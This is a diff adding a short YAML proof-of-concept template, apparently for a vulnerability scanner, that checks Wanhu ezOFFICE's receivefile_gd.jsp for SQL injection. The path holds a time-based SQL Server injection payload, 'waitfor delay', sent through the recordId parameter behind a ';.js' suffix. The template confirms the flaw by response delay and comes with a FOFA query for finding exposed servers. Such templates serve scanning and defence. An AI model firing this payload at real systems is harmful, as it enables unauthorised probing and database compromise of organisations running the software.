@@ -1,0 +1,26 @@
+id: poc-yaml-wanhu-ezoffice-receivefile-gd-jsp-sqli
+info:
+  name: 万户 ezOFFICE receivefile_gd.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+%270:0:3%27--+-
+  expression: 'status_code == 200 &&
+
+    contains(title,"正在归档中,请稍后") &&
+
+    contains(body,"document.all.gd.src=url") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
